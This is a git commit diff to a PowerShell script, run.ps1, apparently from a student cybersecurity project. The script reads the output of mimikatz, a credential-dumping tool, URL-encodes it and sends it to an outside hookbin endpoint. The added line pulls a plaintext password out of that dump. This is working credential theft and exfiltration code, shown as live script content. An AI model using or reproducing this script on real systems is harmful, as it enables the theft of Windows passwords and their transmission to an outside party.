332149d76330081f404b8fa07750d62aadd14b6a
projetcybersecurite <hedi.ghediri.mail@gmail.com>
2018-01-22 13:47:42 +0100

    shaio

--- run.ps1
+++ run.ps1
@@ -28,6 +28,7 @@ $out = Get-Content ./output_mimikatz
 $out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
 (new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}") > $null 2>&1 
 
+cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
 $password = cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
 echo "PASSWORD = $password"
 $password = $password.substring(1)
